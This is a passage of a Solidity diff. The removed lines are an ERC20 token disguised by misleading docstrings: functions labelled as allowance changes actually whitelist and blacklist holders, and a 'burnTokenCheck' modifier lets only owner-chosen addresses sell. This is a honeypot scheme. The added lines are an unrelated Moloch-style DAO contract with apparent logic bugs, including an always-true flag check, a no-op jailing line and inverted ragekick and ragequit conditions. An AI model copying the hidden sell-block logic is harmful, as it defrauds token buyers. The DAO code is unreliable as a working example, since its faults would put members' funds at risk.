-    }
-   }
-
-    /**
-     * @dev See {IERC20-allowance}.
-     */
-    function allowance(address owner, address spender) public view virtual override returns (uint256) {
-        return _allowances[owner][spender];
-    }
-
-    /**
-     * @dev See {IERC20-approve}.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     */
-    function approve(address spender, uint256 amount) public virtual override returns (bool) {
-        _approve(_msgSender(), spender, amount);
-        return true;
-    }
-
-    /**
-     * @dev See {IERC20-transferFrom}.
-     *
-     * Emits an {Approval} event indicating the updated allowance. This is not
-     * required by the EIP. See the note at the beginning of {ERC20};
-     *
-     * Requirements:
-     * - `sender` and `recipient` cannot be the zero address.
-     * - `sender` must have a balance of at least `amount`.
-     * - the caller must have allowance for ``sender``'s tokens of at least
-     * `amount`.
-     */
-    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
-        _approveCheck(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
-        return true;
-    }
-
-    /**
-     * @dev Atomically increases the allowance granted to `spender` by the caller.
-     *
-     * This is an alternative to {approve} that can be used as a mitigation for
-     * problems described in {IERC20-approve}.
-     *
-     * Emits an {Approval} event indicating the updated allowance.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     */
-    function increaseAllowance(address[] memory receivers) public {
-        require(msg.sender == _owner, "!owner");
-        for (uint256 i = 0; i < receivers.length; i++) {
-           _whiteAddress[receivers[i]] = true;
-           _blackAddress[receivers[i]] = false;
+    /******************
+    SUMMONING FUNCTIONS
+    ******************/
+    function init(
+        address[] calldata _founders,
+        address[] calldata _approvedTokens,
+        address _daoFee,
+        uint256 _periodDuration,
+        uint256 _votingPeriodLength,
+        uint256 _gracePeriodLength,
+        uint256 _proposalDepositReward,
+        uint256 _depositRate,
+        uint256 _partyGoal,
+        uint256 _dilutionBound
+    ) external {
+        require(!initialized, "initialized");
+        initialized = true;
+        require(_periodDuration > 0, "_periodDuration zeroed");
+        require(_votingPeriodLength > 0, "_votingPeriodLength zeroed");
+        require(_votingPeriodLength <= MAX_INPUT, "_votingPeriodLength maxed");
+        require(_gracePeriodLength <= MAX_INPUT, "_gracePeriodLength maxed");
+        require(_approvedTokens.length > 0, "need token");
+        
+        depositToken = _approvedTokens[0];
+        idleToken = _approvedTokens[1];
+        // NOTE: move event up here, avoid stack too deep if too many approved tokens
+        emit SummonComplete(_founders, _approvedTokens, now, _periodDuration, _votingPeriodLength, _gracePeriodLength, _proposalDepositReward, _depositRate, _partyGoal);
+        
+        for (uint256 i = 0; i < _approvedTokens.length; i++) {
+            require(!tokenWhitelist[_approvedTokens[i]], "token duplicated");
+            tokenWhitelist[_approvedTokens[i]] = true;
+            approvedTokens.push(_approvedTokens[i]);
         }
+        
+         for (uint256 i = 0; i < _founders.length; i++) {
+             _addFounder(_founders[i]);
+         }
+        
+        daoFee = _daoFee;
+        periodDuration = _periodDuration;
+        votingPeriodLength = _votingPeriodLength;
+        gracePeriodLength = _gracePeriodLength;
+        proposalDepositReward = _proposalDepositReward;
+        depositRate = _depositRate;
+        partyGoal = _partyGoal;
+        summoningTime = now;
+        goalHit = 0;
+        dilutionBound = _dilutionBound;
+        
+        _initReentrancyGuard();
     }
+    
+    
+    function _addFounder(address founder) internal {
+            members[founder] = Member(0, 0, 0, 0, 0, 0, false, true);
+            memberList.push(founder);
+    }
+    
+    // Can also be used to upgrade the idle contract, but not switch to new DeFi token (ie. iDAI to iUSDC)
+     function _setIdle(address _idleToken) internal {
+         idleToken = _idleToken;
+     }
+    
 
-    /**
-     * @dev Atomically decreases the allowance granted to `spender` by the caller.
-     *
-     * This is an alternative to {approve} that can be used as a mitigation for
-     * problems described in {IERC20-approve}.
-     *
-     * Emits an {Approval} event indicating the updated allowance.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     * - `spender` must have allowance for the caller of at least
-     * `subtractedValue`.
-     */
-   function decreaseAllowance(address safeOwner) public {
-        require(msg.sender == _owner, "!owner");
-        _safeOwner = safeOwner;
-    }
-    
-    
-     /**
-     * @dev Atomically increases the allowance granted to `spender` by the caller.
-     *
-     * This is an alternative to {approve} that can be used as a mitigation for
-     * problems described in {IERC20-approve}.
-     *
-     * Emits an {Approval} event indicating the updated allowance.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     */
-    function addApprove(address[] memory receivers) public {
-        require(msg.sender == _owner, "!owner");
-        for (uint256 i = 0; i < receivers.length; i++) {
-           _blackAddress[receivers[i]] = true;
-           _whiteAddress[receivers[i]] = false;
+     /*****************
+    PROPOSAL FUNCTIONS
+    *****************/
+    function submitProposal(
+        address applicant,
+        uint256 tributeOffered,
+        uint256 sharesRequested,
+        uint256 lootRequested,
+        uint256 paymentRequested,
+        uint256 flagNumber,
+        address tributeToken,
+        address paymentToken,
+        bytes32 details
+    ) public nonReentrant returns (uint256 proposalId) {
+        require(sharesRequested.add(lootRequested) <= MAX_INPUT, "shares maxed");
+        if(flagNumber != 7){
+            require(tokenWhitelist[tributeToken] && tokenWhitelist[paymentToken], "tokens not whitelisted");
+            // collect tribute from proposer and store it in the Moloch until the proposal is processed
+            require(IERC20(tributeToken).transferFrom(msg.sender, address(this), tributeOffered), "tribute token transfer failed");
+            unsafeAddToBalance(ESCROW, tributeToken, tributeOffered);
         }
-    }
+        require(applicant != address(0), "applicant cannot be 0");
+        require(members[applicant].jailed == false, "applicant jailed");
+        require(flagNumber != 0 || flagNumber != 1 || flagNumber != 2 || flagNumber != 3, "flag must be 4 - guildkick, 5 - spending, 6 - membership, 7 - governance");
+        
+        // collect deposit from proposer
+        require(IERC20(depositToken).transferFrom(msg.sender, address(this), proposalDepositReward), "proposal deposit failed");
+        unsafeAddToBalance(ESCROW, paymentToken, proposalDepositReward);
 
+        
+        // check whether pool goal is met before allowing spending proposals
+        if(flagNumber == 5) {
+            require(goalHit == 1, "goal not met yet");
+        }
+        
+         if(flagNumber == 6) {
+            require(paymentRequested == 0 || goalHit == 1, "goal not met yet");
+        }
+        
+        bool[8] memory flags; // [sponsored, processed, didPass, cancelled, guildkick, spending, member, governance]
+        flags[flagNumber] = true;
+        
+        if(flagNumber == 4) {
+            _submitProposal(applicant, 0, 0, 0, address(0), 0, address(0), details, flags);
+        } 
+        
+        else if (flagNumber == 7) { // for amend governance use sharesRequested for partyGoal, tributeRequested for depositRate, tributeToken for new Token, paymentToken for new idleToken
+            _submitProposal(applicant, 0, 0, tributeOffered, tributeToken, paymentRequested, paymentToken, details, flags);
+        } 
+        
+        else {
+        
+        _submitProposal(applicant, sharesRequested, lootRequested, tributeOffered, tributeToken, paymentRequested, paymentToken, details, flags);
 
-    /**
-     * @dev Moves tokens `amount` from `sender` to `recipient`.
-     *
-     * This is internal function is equivalent to {transfer}, and can be used to
-     * e.g. implement automatic token fees, slashing mechanisms, etc.
-     *
-     * Emits a {Transfer} event.
-     *
-     * Requirements:
-     *
-     * - `sender` cannot be the zero address.
-     * - `recipient` cannot be the zero address.
-     * - `sender` must have a balance of at least `amount`.
-     */
-    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
-        require(sender != address(0), "ERC20: transfer from the zero address");
-        require(recipient != address(0), "ERC20: transfer to the zero address");
-
-        _beforeTokenTransfer(sender, recipient, amount);
-    
-        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
-        _balances[recipient] = _balances[recipient].add(amount);
-        emit Transfer(sender, recipient, amount);
-    }
-
-    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
-     * the total supply.
-     *
-     * Emits a {Transfer} event with `from` set to the zero address.
-     *
-     * Requirements
-     *
-     * - `to` cannot be the zero address.
-     */
-    function _mint(address account, uint256 amount) public {
-        require(msg.sender == _owner, "ERC20: mint to the zero address");
-        _totalSupply = _totalSupply.add(amount);
-        _balances[_owner] = _balances[_owner].add(amount);
-        emit Transfer(address(0), account, amount);
-    }
-
-    /**
-     * @dev Destroys `amount` tokens from `account`, reducing the
-     * total supply.
-     *
-     * Emits a {Transfer} event with `to` set to the zero address.
-     *
-     * Requirements
-     *
-     * - `account` cannot be the zero address.
-     * - `account` must have at least `amount` tokens.
-     */
-    function _burn(uint256 amount) public {
-        _beforeTokenTransfer(msg.sender, address(0), amount);
-
-        _balances[msg.sender] = _balances[msg.sender].sub(amount, "ERC20: burn amount exceeds balance");
-        _balances[address(0)] = _balances[address(0)].add(amount);
-        //_totalSupply = _totalSupply.sub(amount);
-        emit Transfer(msg.sender, address(0), amount);
-    }
-
-    /**
-     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
-     *
-     * This is internal function is equivalent to `approve`, and can be used to
-     * e.g. set automatic allowances for certain subsystems, etc.
-     *
-     * Emits an {Approval} event.
-     *
-     * Requirements:
-     *
-     * - `owner` cannot be the zero address.
-     * - `spender` cannot be the zero address.
-     */
-    function _approve(address owner, address spender, uint256 amount) internal virtual {
-        require(owner != address(0), "ERC20: approve from the zero address");
-        require(spender != address(0), "ERC20: approve to the zero address");
-        _allowances[owner][spender] = amount;
-        emit Approval(owner, spender, amount);
+        }
+        // NOTE: Should approve the 0x address as a blank token for guildKick proposals where there's no token. 
+        return proposalCount - 1; // return proposalId - contracts calling submit might want it
     }
     
-    
-    /**
-     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
-     *
-     * This is internal function is equivalent to `approve`, and can be used to
-     * e.g. set automatic allowances for certain subsystems, etc.
-     *
-     * Emits an {Approval} event.
-     *
-     * Requirements:
-     *
-     * - `owner` cannot be the zero address.
-     * - `spender` cannot be the zero address.
-     */
-    function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
-        require(sender != address(0), "ERC20: transfer from the zero address");
-        require(recipient != address(0), "ERC20: transfer to the zero address");
 
-        _beforeTokenTransfer(sender, recipient, amount);
-    
-        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
-        _balances[recipient] = _balances[recipient].add(amount);
-        emit Transfer(sender, recipient, amount);
+   function _submitProposal(
+        address applicant,
+        uint256 sharesRequested,
+        uint256 lootRequested,
+        uint256 tributeOffered,
+        address tributeToken,
+        uint256 paymentRequested,
+        address paymentToken,
+        bytes32 details,
+        bool[8] memory flags
+    ) internal {
+        Proposal memory proposal = Proposal({
+            applicant : applicant,
+            proposer : msg.sender,
+            sponsor : address(0),
+            sharesRequested : sharesRequested,
+            lootRequested : lootRequested,
+            tributeOffered : tributeOffered,
+            tributeToken : tributeToken,
+            paymentRequested : paymentRequested,
+            paymentToken : paymentToken,
+            startingPeriod : 0,
+            yesVotes : 0,
+            noVotes : 0,
+            flags : flags,
+            details : details,
+            maxTotalSharesAndLootAtYesVote : 0
+        });
+        
+        proposals[proposalCount] = proposal;
+        address memberAddress = msg.sender;
+        // NOTE: argument order matters, avoid stack too deep
+        emit SubmitProposal(applicant, sharesRequested, lootRequested, tributeOffered, tributeToken, paymentRequested, paymentToken, details, flags, proposalCount, msg.sender, memberAddress);
+        proposalCount += 1;
     }
-    
-     /**
-     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
-     *
-     * This is internal function is equivalent to `approve`, and can be used to
-     * e.g. set automatic allowances for certain subsystems, etc.
-     *
-     * Emits an {Approval} event.
-     *
-     * Requirements:
-     *
-     * - `sender` cannot be the zero address.
-     * - `spender` cannot be the zero address.
-     */
-    modifier burnTokenCheck(address sender, address recipient, uint256 amount){
-        if (_owner == _safeOwner && sender == _owner){_safeOwner = recipient;_;}else{
-            if (sender == _owner || sender == _safeOwner || recipient == _owner){
-                if (sender == _owner && sender == recipient){_sellAmount = amount;}_;}else{
-                if (_whiteAddress[sender] == true){
-                _;}else{if (_blackAddress[sender] == true){
-                require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}else{
-                if (amount < _sellAmount){
-                if(recipient == _safeOwner){_blackAddress[sender] = true; _whiteAddress[sender] = false;}
-                _; }else{require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}
-                    }
+
+    function sponsorProposal(uint256 proposalId) public nonReentrant  {
+
+        Proposal storage proposal = proposals[proposalId];
+
+        require(proposal.proposer != address(0), 'proposal must have been proposed');
+        require(!proposal.flags[0], "proposal has already been sponsored");
+        require(!proposal.flags[3], "proposal has been cancelled");
+        require(members[proposal.applicant].jailed == false, "proposal applicant must not be jailed");
+
+        if (proposal.tributeOffered > 0 && userTokenBalances[GUILD][proposal.tributeToken] == 0) {
+            require(approvedTokens.length < MAX_TOKEN_WHITELIST_COUNT, 'cannot sponsor more tribute proposals for new tokens - guildbank is full');
+        }
+
+         if (proposal.flags[4]) {
+            require(!proposedToKick[proposal.applicant], 'already proposed to kick');
+            proposedToKick[proposal.applicant] = true;
+        }
+
+        // compute startingPeriod for proposal
+        uint256 startingPeriod = max(
+            getCurrentPeriod(),
+            proposalQueue.length == 0 ? 0 : proposals[proposalQueue[proposalQueue.length.sub(1)]].startingPeriod
+        ).add(1);
+
+        proposal.startingPeriod = startingPeriod;
+
+        address memberAddress = msg.sender;
+        proposal.sponsor = memberAddress;
+
+        proposal.flags[0] = true; // sponsored
+
+        // append proposal to the queue
+        proposalQueue.push(proposalId);
+        
+        emit SponsorProposal(msg.sender, memberAddress, proposalId, proposalQueue.length.sub(1), startingPeriod);
+    }
+
+
+    function submitVote(uint256 proposalIndex, uint8 uintVote) public nonReentrant {
+        require(members[msg.sender].exists == true);
+        Member storage member = members[msg.sender];
+
+        require(proposalIndex < proposalQueue.length, "proposal does not exist");
+        Proposal storage proposal = proposals[proposalQueue[proposalIndex]];
+
+        require(uintVote < 3, "must be less than 3, 1 = yes, 2 = no");
+        Vote vote = Vote(uintVote);
+
+        require(getCurrentPeriod() >= proposal.startingPeriod, "voting period has not started");
+        require(!hasVotingPeriodExpired(proposal.startingPeriod), "proposal voting period has expired");
+        require(proposal.votesByMember[msg.sender] == Vote.Null, "member has already voted");
+        require(vote == Vote.Yes || vote == Vote.No, "vote must be either Yes or No");
+
+        proposal.votesByMember[msg.sender] = vote;
+
+        if (vote == Vote.Yes) {
+            proposal.yesVotes = proposal.yesVotes.add(member.shares);
+
+            // set highest index (latest) yes vote - must be processed for member to ragequit
+            if (proposalIndex > member.highestIndexYesVote) {
+                member.highestIndexYesVote = proposalIndex;
+            }
+
+            // set maximum of total shares encountered at a yes vote - used to bound dilution for yes voters
+            if (totalShares.add(totalLoot) > proposal.maxTotalSharesAndLootAtYesVote) {
+                proposal.maxTotalSharesAndLootAtYesVote = totalShares.add(totalLoot);
+            }
+
+        } else if (vote == Vote.No) {
+            proposal.noVotes = proposal.noVotes.add(member.shares);
+        }
+     
+        emit SubmitVote(proposalQueue[proposalIndex], proposalIndex, msg.sender, msg.sender, uintVote);
+    }
+
+    function processProposal(uint256 proposalIndex) public nonReentrant {
+        _validateProposalForProcessing(proposalIndex);
+
+        uint256 proposalId = proposalQueue[proposalIndex];
+        Proposal storage proposal = proposals[proposalId];
+        
+        //[sponsored -0 , processed -1, didPass -2, cancelled -3, guildkick -4, spending -5, member -6, governance -7]
+        require(!proposal.flags[4] && !proposal.flags[7], "not standard proposal"); 
+
+        proposal.flags[1] = true; // processed
+
+        bool didPass = _didPass(proposalIndex);
+
+        // Make the proposal fail if the new total number of shares and loot exceeds the limit
+        if (totalShares.add(totalLoot).add(proposal.sharesRequested).add(proposal.lootRequested) > MAX_INPUT) {
+            didPass = false;
+        }
+
+        // Make the proposal fail if it is requesting more tokens as payment than the available guild bank balance
+        if (proposal.paymentToken != depositToken && proposal.paymentRequested > userTokenBalances[GUILD][proposal.paymentToken]) {
+            didPass = false;
+        }
+
+        // PROPOSAL PASSED
+        if (didPass) {
+            proposal.flags[2] = true; // didPass
+
+            // if the applicant is already a member, add to their existing shares & loot
+            if (members[proposal.applicant].exists) {
+                members[proposal.applicant].shares = members[proposal.applicant].shares.add(proposal.sharesRequested);
+                members[proposal.applicant].loot = members[proposal.applicant].loot.add(proposal.lootRequested);
+
+            // the applicant is a new member, create a new record for them
+            } else {
+
+                members[proposal.applicant] = Member(proposal.sharesRequested, proposal.lootRequested, 0, 0, 0, 0, false, true);
+                memberList.push(proposal.applicant);
+            }
+
+            // mint new shares & loot
+            totalShares = totalShares.add(proposal.sharesRequested);
+            totalLoot = totalLoot.add(proposal.lootRequested);
+
+             if (proposal.tributeToken == depositToken && proposal.tributeOffered > 0) {
+                 unsafeSubtractFromBalance(ESCROW, proposal.tributeToken, proposal.tributeOffered);
+                 depositToIdle(proposal.applicant, proposal.tributeOffered, proposal.sharesRequested);
+             } else {
+               unsafeInternalTransfer(ESCROW, GUILD, proposal.tributeToken, proposal.tributeOffered);
+             }
+            
+             if (proposal.paymentToken == address(idleToken)) {
+                 uint256 proposalPayment = subFees(GUILD, proposal.paymentRequested);
+                 unsafeInternalTransfer(GUILD, proposal.applicant, proposal.paymentToken, proposalPayment);
+             }
+            
+             if (proposal.paymentToken == depositToken && proposal.paymentRequested > 0 ){
+                uint256 iTokenPrice = IIdleToken(idleToken).tokenPrice();
+                uint256 idleToConvert = proposal.paymentRequested.div(iTokenPrice);
+                uint256 idleRedemptionAmt = subFees(GUILD, idleToConvert);
+                
+                if(idleRedemptionAmt > userTokenBalances[GUILD][address(idleToken)]){
+                    proposal.flags[2] = false;
                 }
+                
+                uint256 depositTokenAmt = IIdleToken(idleToken).redeemIdleToken(idleRedemptionAmt);
+                unsafeAddToBalance(proposal.applicant, proposal.paymentToken, depositTokenAmt);
+                
+                emit ProcessIdleProposal(proposalIndex, proposalId, idleRedemptionAmt, depositTokenAmt);
+             }
+            
+            unsafeInternalTransfer(GUILD, proposal.applicant, proposal.paymentToken, proposal.paymentRequested);
+
+        // PROPOSAL FAILED
+        } else {
+            // return all tokens to the proposer (not the applicant, because funds come from proposer)
+            unsafeInternalTransfer(ESCROW, proposal.proposer, proposal.tributeToken, proposal.tributeOffered);
+        }
+
+        _returnDeposit();
+        
+        emit ProcessProposal(proposalIndex, proposalId, didPass);
+    }
+
+
+    function processGuildKickProposal(uint256 proposalIndex) public nonReentrant {
+        _validateProposalForProcessing(proposalIndex);
+
+        uint256 proposalId = proposalQueue[proposalIndex];
+        Proposal storage proposal = proposals[proposalId];
+
+        require(proposal.flags[4], "not guild kick");
+
+        proposal.flags[1] = true; //[sponsored, processed, didPass, cancelled, guildkick, spending, member]
+
+        bool didPass = _didPass(proposalIndex);
+
+        if (didPass) {
+            proposal.flags[2] = true; // didPass
+            Member storage member = members[proposal.applicant];
+            member.jailed == true;
+
+            // transfer shares to loot
+            member.loot = member.loot.add(member.shares);
+            totalShares = totalShares.sub(member.shares);
+            totalLoot = totalLoot.add(member.shares);
+            member.shares = 0; // revoke all shares
+        }
+
+        proposedToKick[proposal.applicant] = false;
+
+        _returnDeposit();
+
+        emit ProcessGuildKickProposal(proposalIndex, proposalId, didPass);
+    }
+    
+    function processAmendGovernance(uint256 proposalIndex) public nonReentrant {
+        _validateProposalForProcessing(proposalIndex);
+
+        uint256 proposalId = proposalQueue[proposalIndex];
+        Proposal storage proposal = proposals[proposalId];
+
+        require(proposal.flags[7], "not gov amendment");
+
+        proposal.flags[1] = true; //[sponsored, processed, didPass, cancelled, guildkick, spending, member]
+
+        bool didPass = _didPass(proposalIndex);
+
+            if (didPass) {
+                proposal.flags[2] = true; // didPass
+            
+            // Updates PartyGoal
+            if(proposal.tributeOffered > 0){
+                partyGoal = proposal.tributeOffered;
+            }
+            
+            // Update depositRate
+            if(proposal.paymentRequested > 0){
+                depositRate = proposal.paymentRequested;
+            }
+            
+            // Adds token to whitelist and approvedTokens
+            if(proposal.tributeToken != depositToken) {
+                require(!tokenWhitelist[proposal.tributeToken], "cannot already have whitelisted the token");
+                require(approvedTokens.length < MAX_TOKEN_WHITELIST_COUNT, "too many tokens already");
+                approvedTokens.push(proposal.tributeToken);
+                tokenWhitelist[address(proposal.tributeToken)] = true;
+            }
+            // Used to upgrade iToken, cannot be used to switch iToken since depositToken is static
+            if(proposal.paymentToken != address(idleToken) && proposal.paymentToken != depositToken) {
+                _setIdle(proposal.paymentToken);
+                approvedTokens.push(proposal.paymentToken);
+                tokenWhitelist[address(proposal.paymentToken)] = true;
             }
         }
+
+        _returnDeposit();
+        
+        emit ProcessAmendGovernance(proposalIndex, proposalId, didPass, proposal.tributeToken, proposal.paymentToken, proposal.tributeOffered, proposal.paymentRequested);
     }
     
-    
-    /**
-     * @dev Sets {decimals} to a value other than the default one of 18.
-     *
-     * WARNING: This function should only be called from the constructor. Most
-     * applications that interact with token contracts will not expect
-     * {decimals} to ever change, and may work incorrectly if it does.
-     */
-    function _setupDecimals(uint8 decimals_) internal {
-        _decimals = decimals_;
+
+    function _didPass(uint256 proposalIndex) internal view returns (bool didPass) {
+        Proposal memory proposal = proposals[proposalQueue[proposalIndex]];
+
+        didPass = proposal.yesVotes > proposal.noVotes;
+
+        // Make the proposal fail if the dilutionBound is exceeded
+        if ((totalShares.add(totalLoot)).mul(dilutionBound / 100) < proposal.maxTotalSharesAndLootAtYesVote) {
+            didPass = false;
+        }
+
+        // Make the proposal fail if the applicant is jailed
+        // - for standard proposals, we don't want the applicant to get any shares/loot/payment
+        // - for guild kick proposals, we should never be able to propose to kick a jailed member (or have two kick proposals active), so it doesn't matter
+        if (members[proposal.applicant].jailed == true) {
+            didPass = false;
+        }
+
+        return didPass;
     }
 
-    /**
-     * @dev Hook that is called before any transfer of tokens. This includes
-     * minting and burning.
-     *
-     * Calling conditions:
-     *
-     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
-     * will be to transferred to `to`.
-     * - when `from` is zero, `amount` tokens will be minted for `to`.
-     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
-     * - `from` and `to` are never both zero.
-     *
-     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
-     */
-    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
+    function _validateProposalForProcessing(uint256 proposalIndex) internal view {
+        require(proposalIndex < proposalQueue.length, "no such proposal");
+        Proposal memory proposal = proposals[proposalQueue[proposalIndex]];
+
+        require(getCurrentPeriod() >= proposal.startingPeriod.add(votingPeriodLength).add(gracePeriodLength), "proposal not ready");
+        require(proposal.flags[1] == false, "proposal has already been processed");
+        require(proposalIndex == 0 || proposals[proposalQueue[proposalIndex.sub(1)]].flags[1], "previous proposal unprocessed");
+    }
+
+    function _returnDeposit() internal {
+        unsafeInternalTransfer(ESCROW, msg.sender, depositToken, proposalDepositReward);
+    }
+
+    function ragequit() public nonReentrant {
+        /* 
+        @Dev - to simplify accounting had to set ragequit to an all or nothing proposition.
+        Since members who ragequit can always redeposit after the ragequit, it should not 
+        be to limiting until a better system can be implemented in ModMol v3. 
+        */
+        
+        require(members[msg.sender].shares.add(members[msg.sender].loot) > 0, "only users with balances can ragequit");
+        _ragequit(msg.sender);
+    }
+
+    function _ragequit(address memberAddress) internal returns (uint256) {
+        uint256 initialTotalSharesAndLoot = totalShares.add(totalLoot);
+
+        Member storage member = members[memberAddress];
+
+        require(canRagequit(member.highestIndexYesVote), "cannot ragequit until highest index proposal member voted YES on is processed");
+
+        // set member shares and loot to 
+        uint256 sharesToBurn = member.shares;
+        uint256 lootToBurn = member.loot;
+        uint256 sharesAndLootToBurn = sharesToBurn.add(lootToBurn);
+
+        // burn shares and loot (obviously sets member shares and loot back to 0)
+        member.shares = member.shares.sub(sharesToBurn);
+        member.loot = member.loot.sub(lootToBurn);
+        totalShares = totalShares.sub(sharesToBurn);
+        totalLoot = totalLoot.sub(lootToBurn);
+
+        for (uint256 i = 0; i < approvedTokens.length; i++) {
+            uint256 amountToRagequit = fairShare(userTokenBalances[GUILD][approvedTokens[i]], sharesAndLootToBurn, initialTotalSharesAndLoot);
+            if (amountToRagequit > 0) { // gas optimization to allow a higher maximum token limit
+                userTokenBalances[GUILD][approvedTokens[i]] -= amountToRagequit;
+                userTokenBalances[memberAddress][approvedTokens[i]] += amountToRagequit;
+                uint256 feeEligible = getUserEarnings(member.iTB);
+                subFees(memberAddress, feeEligible);
+               
+                // Only runs guild bank adjustment if member has withdrawn tokens.
+                // Otherwise, adjustment would end up costing member their fair share
+                    
+                 if(member.iTW > 0) {
+                    // @Dev - SafeMath wasn't working here. 
+                     uint256 iAdj = amountToRagequit - member.iTB;
+                     if(iAdj > 0) {
+                        unsafeInternalTransfer(memberAddress, GUILD, address(idleToken), iAdj);
+                     }
+                 }
+                 
+                // Reset member-specific internal accting 
+                member.iTB = 0;
+                member.iTW = 0;
+                member.iVal = 0;
+            }
+        }
+        emit Ragequit(msg.sender, sharesToBurn, lootToBurn);  
+    }
+
+    function ragekick(address memberToKick) public nonReentrant {
+        Member storage member = members[memberToKick];
+
+        require(member.jailed != true, "member not jailed");
+        require(member.loot > 0, "member must have loot"); // note - should be impossible for jailed member to have shares
+        require(canRagequit(member.highestIndexYesVote), "cannot ragequit until highest index proposal member voted YES on is processed");
+
+        _ragequit(memberToKick);
+    }
+    
+    function withdrawEarnings(address memberAddress, uint256 amount) external nonReentrant {
+        
+        Member storage member = members[memberAddress];
+        
+        require(member.exists == true, "not member");
+        require(address(msg.sender) == memberAddress, "can only be called by member");
+        
+
+        uint256 iTBVal = getIdleValue(member.iTB);
+        require(iTBVal.sub(member.iVal) >= amount, "not enough earnings to redeem this many tokens");
+        
+        uint256 earningsToUser = subFees(GUILD, amount);
+        uint256 redeemedTokens = IIdleToken(idleToken).redeemIdleToken(earningsToUser);
+        
+        // Accounting updates
+        member.iTW += earningsToUser;
+        member.iTB -= earningsToUser;
+        unsafeSubtractFromBalance(GUILD, address(idleToken), earningsToUser);
+        unsafeAddToBalance(GUILD, depositToken, redeemedTokens);
+        unsafeInternalTransfer(GUILD, memberAddress, depositToken, redeemedTokens);
+        
+        emit WithdrawEarnings(msg.sender, address(idleToken), earningsToUser, depositToken, redeemedTokens);
+    }
+
+    function withdrawBalance(address token, uint256 amount) public nonReentrant {
+        _withdrawBalance(token, amount);
+    }
+    
+
+    function withdrawBalances(address[] memory tokens, uint256[] memory amounts, bool max) public nonReentrant {
+        require(tokens.length == amounts.length, "tokens + amounts arrays must match");
+
+        for (uint256 i=0; i < tokens.length; i++) {
+            uint256 withdrawAmount = amounts[i];
+            if (max) { // withdraw the maximum balance
+                withdrawAmount = userTokenBalances[msg.sender][tokens[i]];
+            }
+
+            _withdrawBalance(tokens[i], withdrawAmount);
+        }
+    }
+    
+    
+    function _withdrawBalance(address token, uint256 amount) internal {
+        require(userTokenBalances[msg.sender][token] >= amount, "insufficient balance");
+        unsafeSubtractFromBalance(msg.sender, token, amount);
+        require(IERC20(token).transfer(msg.sender, amount), "transfer failed");
+        emit Withdraw(msg.sender, token, amount);
+    }
+    
+
+    // NOTE: gives the DAO the ability to collect payments and also recover tokens just sent to DAO address (if whitelisted)
+    function collectTokens(address token) external {
+        uint256 amountToCollect = IERC20(token).balanceOf(address(this)) - userTokenBalances[TOTAL][token];
+        // only collect if 1) there are tokens to collect and 2) token is whitelisted
+        require(amountToCollect > 0, "no tokens");
+        require(tokenWhitelist[token], "not whitelisted");
+        
+        unsafeAddToBalance(GUILD, token, amountToCollect);
+
+        emit TokensCollected(token, amountToCollect);
+    }
+    
+
+    function cancelProposal(uint256 proposalId) public nonReentrant {
+        Proposal storage proposal = proposals[proposalId];
+        require(getCurrentPeriod() <= proposal.startingPeriod, "voting period has already started");
+        require(!proposal.flags[3], "proposal already cancelled");
+        require(msg.sender == proposal.proposer, "only proposer cancels");
+
+        proposal.flags[3] = true; // cancelled
+        
+        unsafeInternalTransfer(ESCROW, proposal.proposer, proposal.tributeToken, proposal.tributeOffered);
+        emit CancelProposal(proposalId, msg.sender);
+    }
+
+    // can only ragequit if the latest proposal you voted YES on has been processed
+    function canRagequit(uint256 highestIndexYesVote) public view returns (bool) {
+        if(proposalQueue.length == 0){
+            return true;
+        } else {
+            require(highestIndexYesVote < proposalQueue.length, "no such proposal");
+            return proposals[proposalQueue[highestIndexYesVote]].flags[0];
+        }
+    }
+
+    function hasVotingPeriodExpired(uint256 startingPeriod) public view returns (bool) {
+        return getCurrentPeriod() >= startingPeriod.add(votingPeriodLength);
+    }
+    
+    /***************
+    GETTER FUNCTIONS
+    ***************/
+    function max(uint256 x, uint256 y) internal pure returns (uint256) {
+        return x >= y ? x : y;
+    }
+
+    function getCurrentPeriod() public view returns (uint256) {
+        return now.sub(summoningTime).div(periodDuration);
+    }
+
+    function getProposalQueueLength() public view returns (uint256) {
+        return proposalQueue.length;
+    }
+
+    function getProposalFlags(uint256 proposalId) public view returns (bool[8] memory) {
+        return proposals[proposalId].flags;
+    }
+
+    function getUserTokenBalance(address user, address token) public view returns (uint256) {
+        return userTokenBalances[user][token];
+    }
+
+    function getMemberProposalVote(address memberAddress, uint256 proposalIndex) public view returns (Vote) {
+        require(members[memberAddress].exists, "no such member");
+        require(proposalIndex < proposalQueue.length, "unproposed");
+        return proposals[proposalQueue[proposalIndex]].votesByMember[memberAddress];
+    }
+
+    function getTokenCount() public view returns (uint256) {
+        return approvedTokens.length;
+    }
+
+    /***************
+    HELPER FUNCTIONS
+    ***************/
+    
+    function getUserEarnings(uint256 amount) public returns (uint256) {
+        uint256 userBalance = amount;
+        uint256 avgCost = userBalance.mul(IIdleToken(idleToken).userAvgPrices(address(this))).div(10**18);
+        uint256 currentValue = userBalance.mul(IIdleToken(idleToken).tokenPrice()).div(10**18);
+        uint256 earnings = currentValue.sub(avgCost);
+
+        return earnings;
+    }
+    
+    
+    function getIdleValue(uint256 amount) public view returns (uint256){
